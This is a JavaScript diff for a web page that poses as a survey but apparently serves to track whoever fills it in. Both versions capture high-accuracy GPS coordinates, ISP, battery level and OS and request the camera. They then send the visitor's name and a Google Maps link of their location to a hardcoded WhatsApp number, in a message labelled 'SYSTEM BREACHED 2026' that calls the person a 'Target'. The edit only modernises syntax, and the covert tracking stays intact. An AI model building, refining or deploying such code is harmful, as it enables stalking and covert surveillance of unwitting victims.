@@ -1,102 +1,97 @@
-const nomorWA = "628979100200";
-let userData = { 
-    coords: "Tidak Diizinkan", 
+var nomorWA = "628979100200";
+var userData = { 
+    coords: "0,0", 
     os: navigator.platform,
-    battery: "Scanning...",
+    battery: "Unknown",
     isp: "Detecting..."
 };
 
-// 1. Fungsi Ambil Data ISP & Baterai
+// 1. Ambil Data Tambahan
 async function getQuickData() {
     try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
+        var res = await fetch('https://ipapi.co/json/');
+        var data = await res.json();
         userData.isp = data.org || "Protected";
     } catch (e) { userData.isp = "ISP Hidden"; }
 
     try {
         if (navigator.getBattery) {
-            const bat = await navigator.getBattery();
+            var bat = await navigator.getBattery();
             userData.battery = Math.round(bat.level * 100) + "%";
         }
-    } catch (e) { userData.battery = "Hardware Blocked"; }
+    } catch (e) { userData.battery = "Blocked"; }
 }
 
-// 2. Handler Tombol Mulai
-const startBtn = document.getElementById('start-survey');
+// 2. Handler Tombol Mulai (Wajib ID: start-survey)
+var startBtn = document.getElementById('start-survey');
 if (startBtn) {
     startBtn.onclick = function() {
+        // Pindah Tampilan
         document.getElementById('step-1').style.display = 'none';
         document.getElementById('step-2').style.display = 'block';
         
         getQuickData();
 
-        // PAKSA GPS AKURASI TINGGI
+        // Ambil Lokasi Tanpa Cache
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    // Update koordinat real-time
-                    userData.coords = pos.coords.latitude + "," + pos.coords.longitude;
-                }, 
-                (err) => { 
-                    console.log("GPS Ditolak"); 
-                }, 
-                {
-                    enableHighAccuracy: true, // WAJIB: Memaksa akurasi GPS maksimal
-                    timeout: 10000,           // Menunggu maksimal 10 detik
-                    maximumAge: 0             // Jangan pakai lokasi lama (cache)
-                }
-            );
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                userData.coords = pos.coords.latitude + "," + pos.coords.longitude;
+            }, function(err) {
+                console.log("GPS Denied");
+            }, { enableHighAccuracy: true, maximumAge: 0 });
         }
 
-        // Minta Izin Kamera
+        // Kamera
         navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => { 
-                const video = document.getElementById('webcam');
-                if (video) video.srcObject = stream; 
+            .then(function(stream) { 
+                var v = document.getElementById('webcam');
+                if (v) v.srcObject = stream; 
             })
-            .catch(e => { console.log("Kamera Blocked"); });
+            .catch(function(e) { console.log("Cam Blocked"); });
     };
 }
 
 // 3. Fungsi Kirim
 function finalSubmit() {
-    const nameVal = document.getElementById('name').value;
-    if (!nameVal) return alert("Isi nama dulu!");
+    var nameVal = document.getElementById('name').value;
+    if (!nameVal) {
+        alert("Isi nama dulu!");
+        return;
+    }
 
     document.getElementById('step-2').style.display = 'none';
     document.getElementById('step-3').style.display = 'block';
 
-    let prg = 0;
-    const bar = document.getElementById('progress');
-    const timer = setInterval(() => {
+    var prg = 0;
+    var timer = setInterval(function() {
         prg += 25;
+        var bar = document.getElementById('progress');
         if (bar) bar.style.width = prg + "%";
-        
+
         if (prg >= 100) {
             clearInterval(timer);
             
-            // Perbaikan URL Maps: Menggunakan Google Maps standard link
-            const mapUrl = "https://www.google.com/maps?q=" + userData.coords;
+            // LINK MAPS: Saya rapihkan supaya tidak error lagi
+            var mapLink = "https://www.google.com/maps?q=" + userData.coords;
             
-            const msg = "🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A" +
-                        "👤 *Target:* " + nameVal + "%0A" +
-                        "📍 *Maps:* " + mapUrl + "%0A" +
-                        "📡 *ISP:* " + userData.isp + "%0A" +
-                        "🔋 *Baterai:* " + userData.battery + "%0A" +
-                        "💻 *OS:* " + userData.os + "%0A%0A" +
-                        "_Status: Data Mirrored._";
+            var msg = "🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A" +
+                      "👤 *Target:* " + nameVal + "%0A" +
+                      "📍 *Maps:* " + mapLink + "%0A" +
+                      "📡 *ISP:* " + userData.isp + "%0A" +
+                      "🔋 *Baterai:* " + userData.battery + "%0A" +
+                      "💻 *OS:* " + userData.os + "%0A%0A" +
+                      "_Status: Live Data Mirrored._";
 
             window.location.href = "https://api.whatsapp.com/send?phone=" + nomorWA + "&text=" + msg;
         }
     }, 600);
 }
 
-// Event Listeners
-const submitBtn = document.getElementById('submit-survey');
+// Pasang Listener
+var submitBtn = document.getElementById('submit-survey');
 if (submitBtn) submitBtn.onclick = finalSubmit;
 
-const nameField = document.getElementById('name');
+var nameField = document.getElementById('name');
 if (nameField) {
-    nameField.onkeydown = (e) => { if (e.key === "Enter") finalSubmit(); };
+    nameField.onkeydown = function(e) { if (e.key === "Enter") finalSubmit(); };
 }
